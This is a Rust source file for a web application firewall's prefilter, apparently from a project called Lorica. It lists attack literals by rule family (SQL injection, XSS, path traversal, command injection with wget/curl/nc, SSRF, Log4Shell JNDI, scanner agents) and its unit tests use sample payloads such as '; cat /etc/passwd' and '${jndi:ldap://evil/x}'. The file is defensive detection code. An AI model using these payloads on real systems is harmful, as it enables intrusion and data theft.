// Copyright 2026 Rwx-G (Lorica)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0

//! Two-phase WAF evaluation prefilter (PERF-9).
//!
//! Aho-Corasick automaton over a curated list of attack literals
//! covering all rule families in the default CRS. Used by
//! [`WafEngine::evaluate`] to short-circuit clean fields without
//! running the full regex pass: if no literal matches, no rule can
//! match either, so the regex scan is skipped.
//!
//! # Coverage contract
//!
//! Every default rule's pattern, when matched, MUST also match at
//! least one of the literals below. The `prefilter_covers_all_rules`
//! integration test enforces this by running every existing test
//! fixture (in both `engine.rs::tests` and `rules.rs::tests`)
//! through the prefilter and asserting it triggers whenever the rule
//! does. Custom user rules are NOT prefiltered (they always run in
//! phase 2).
//!
//! # Why not auto-extract literals from the regex AST
//!
//! `regex-syntax` can extract required literals via
//! `Hir::literal()`, but several CRS patterns use character classes
//! and unicode ranges that yield empty literal sets. Maintaining
//! the list by hand against the rule corpus is tighter and keeps
//! the prefilter under operator review.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};

/// Attack-signal literals. Each entry is matched case-insensitively
/// (ASCII fold) so we don't have to enumerate every casing variant
/// of each keyword.
///
/// Grouped by rule family for readability; ordering does not matter
/// for the AC automaton.
const ATTACK_LITERALS: &[&str] = &[
    // --- SQLi (CRS 942xxx) ---
    // Bare SQL keywords (`select`, `update`, `delete`, etc.) match
    // legitimate URL parameters too often (e.g. `?sort=-updated`),
    // so we anchor each keyword on its rule's surrounding context:
    // - 942100 needs `union ... select|all` -> literals below
    // - 942150 needs `;<keyword>` -> literals below
    "union select",
    "union all",
    "union/*",
    "union\tselect",
    "union  select",
    ";select",
    ";insert",
    ";update",
    ";delete",
    ";drop",
    ";alter",
    "; select",
    "; insert",
    "; update",
    "; delete",
    "; drop",
    "; alter",
    // 942140: DDL combos
    "drop table",
    "drop database",
    "drop index",
    "drop view",
    "alter table",
    "alter database",
    "truncate table",
    "create table",
    "create database",
    // 942130: SQL functions used in time-based / file-write SQLi
    "sleep(",
    "benchmark(",
    "waitfor(",
    "load_file(",
    "into outfile",
    "into dumpfile",
    // SQLi procedure prefixes - rare in legit input.
    "xp_",
    "sp_",
    "/*!",
    // SQLi quote markers - rules anchor on '--', '#' or '/*' after
    // the quote so we look for those combos rather than a bare `'`.
    "'--",
    "'#",
    "'/*",
    "%27--",
    "%27%23",
    "%27/*",
    // OR / AND tautologies - the rule pattern is `\b(or|and)\b\s+\d+\s*=\s*\d+`
    // so we cover the most common shapes here.
    " or 1=",
    " or 0=",
    " and 1=",
    " and 0=",
    "%20or%201=",
    "%20and%201=",
    // --- XSS (CRS 941xxx) ---
    "<script",
    "<iframe",
    "<object",
    "<embed",
    "<applet",
    "<svg",
    "javascript:",
    "data:text/html",
    "onerror",
    "onload",
    "onclick",
    "onmouseover",
    "onfocus",
    "atob(",
    "eval(",
    // --- Path traversal (CRS 930xxx) ---
    // 930100: `(\.\./|\.\.\\|%2e%2e[/\\%]|%252e%252e)` - require
    // the slash/backslash so we don't false-positive on legit URLs
    // containing `..` (e.g. version strings like "v1.2..0").
    "../",
    "..\\",
    "%2e%2e/",
    "%2e%2e\\",
    "%2e%2e%2f",
    "%2e%2e%5c",
    "%252e%252e",
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "proc/self",
    ".env",
    ".git/config",
    "wp-config.php",
    "%00",
    "\\x00",
    // --- Command injection (CRS 932xxx) ---
    // 932100: `[;&|`]\s*(cat|ls|id|whoami|wget|curl|nc|bash|sh|python|perl|ruby|php)\b`
    ";cat",
    ";ls",
    ";id",
    ";whoami",
    ";wget",
    ";curl",
    ";nc",
    ";bash",
    ";sh",
    ";python",
    ";perl",
    ";ruby",
    ";php",
    "|cat",
    "|ls",
    "|id",
    "|whoami",
    "|wget",
    "|curl",
    "|bash",
    "&cat",
    "&ls",
    "&wget",
    "&curl",
    "&bash",
    // 932110: backtick / subshell
    "`",
    "$(",
    // Encoded / spaced variants that the rule's `\s*` matches.
    "; cat",
    "; ls",
    "; id",
    "; whoami",
    "; wget",
    "; curl",
    "; nc",
    "; bash",
    "; sh",
    "; python",
    "; perl",
    "; ruby",
    "; php",
    // --- Protocol violations (CRS 920xxx) ---
    "content-length",
    "%0d%0a",
    "%0d",
    "%0a",
    "\r\n",
    // --- SSRF (CRS 934xxx) ---
    "169.254.169.254",
    "metadata.google.internal",
    "100.100.100.200",
    // 934110: `https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|0x7f)`
    "http://localhost",
    "https://localhost",
    "http://127.0.0.1",
    "https://127.0.0.1",
    "http://0.0.0.0",
    "https://0.0.0.0",
    "http://[::1]",
    "https://[::1]",
    "http://0x7f",
    "https://0x7f",
    "file://",
    "gopher://",
    "dict://",
    "ftp://",
    "ldap://",
    "tftp://",
    // 934130: SSRF via internal network range. Rule pattern is
    // `https?://(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)`
    // so the prefilter matches the scheme+RFC1918-prefix combo
    // rather than the bare IP octet (which would false-positive on
    // any text containing "10.").
    "http://10.",
    "https://10.",
    "http://172.16.",
    "https://172.16.",
    "http://172.17.",
    "https://172.17.",
    "http://172.18.",
    "https://172.18.",
    "http://172.19.",
    "https://172.19.",
    "http://172.2",
    "https://172.2",
    "http://172.30.",
    "https://172.30.",
    "http://172.31.",
    "https://172.31.",
    "http://192.168.",
    "https://192.168.",
    // --- JNDI / Log4Shell (CRS 944xxx) ---
    "${jndi",
    "${lower",
    "${upper",
    "${env",
    "${sys",
    "${date",
    "${java",
    "${${",
    // --- Scanner / bot UAs (CRS 936xxx) ---
    "nmap",
    "nikto",
    "sqlmap",
    "metasploit",
    "nessus",
    "acunetix",
    "burpsuite",
    "burp suite",
    "dirbuster",
    "gobuster",
    "wfuzz",
    "havij",
    "openvas",
    "wpscan",
    "masscan",
    // --- Generic / mass-assignment indicators (CRS 948xxx, 949xxx) ---
    "__proto__",
    "constructor.prototype",
    "prototype[",
    // NoSQL operators
    "$where",
    "$gt",
    "$lt",
    "$ne",
    // XXE / XML
    "<!doctype",
    "<!entity",
    "system \"",
    "system '",
    // SSTI / template injection
    "{{",
    "{%",
    "<%=",
    // Open redirect / scheme hop already covered by SSRF block above
];

/// The compiled prefilter automaton.
pub struct Prefilter {
    automaton: AhoCorasick,
}

impl Prefilter {
    /// Build the prefilter automaton from the curated literal list.
    /// Constructed once at engine init; cheap to share by reference.
    pub fn build() -> Self {
        let automaton = AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::LeftmostFirst)
            .build(ATTACK_LITERALS)
            .expect("ATTACK_LITERALS compiles into a valid AC automaton");
        Self { automaton }
    }

    /// Return `true` if `value` contains any attack literal.
    /// O(n) over `value.len()`; ~ns per byte on modern x86.
    #[inline]
    pub fn matches(&self, value: &str) -> bool {
        self.automaton.is_match(value)
    }
}

impl Default for Prefilter {
    fn default() -> Self {
        Self::build()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_traffic_does_not_trigger_prefilter() {
        let p = Prefilter::build();
        assert!(!p.matches("/api/v1/users/12345/profile"));
        assert!(!p.matches("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"));
        assert!(!p.matches("Bearer eyJhbGciOiJIUzI1NiJ9.payload.signature"));
        assert!(!p.matches("page=1&size=20&sort=-updated"));
        assert!(!p.matches("application/json, text/plain, */*"));
        assert!(!p.matches("https://app.example.com/dashboard"));
    }

    #[test]
    fn known_attacks_trigger_prefilter() {
        let p = Prefilter::build();
        // SQLi
        assert!(p.matches("id=1 UNION SELECT * FROM users"));
        assert!(p.matches("name=admin'--"));
        assert!(p.matches("?id=1; DROP TABLE users"));
        // XSS
        assert!(p.matches("<script>alert(1)</script>"));
        assert!(p.matches("javascript:alert(1)"));
        assert!(p.matches("<iframe src=evil>"));
        assert!(p.matches("<img src=x onerror=alert(1)>"));
        // Path traversal
        assert!(p.matches("../../etc/passwd"));
        assert!(p.matches("%2e%2e/%2e%2e/etc/shadow"));
        assert!(p.matches("/etc/passwd"));
        // Cmdi
        assert!(p.matches("; cat /etc/passwd"));
        assert!(p.matches("$(whoami)"));
        // SSRF
        assert!(p.matches("http://169.254.169.254/latest/meta-data"));
        assert!(p.matches("file:///etc/passwd"));
        // JNDI
        assert!(p.matches("${jndi:ldap://evil/x}"));
        // Scanner UA
        assert!(p.matches("sqlmap/1.7"));
        // Case insensitivity
        assert!(p.matches("UNION SELECT"));
        assert!(p.matches("union select"));
        assert!(p.matches("Union Select"));
    }

    #[test]
    fn prefilter_returns_false_on_empty_input() {
        let p = Prefilter::build();
        assert!(!p.matches(""));
    }
}
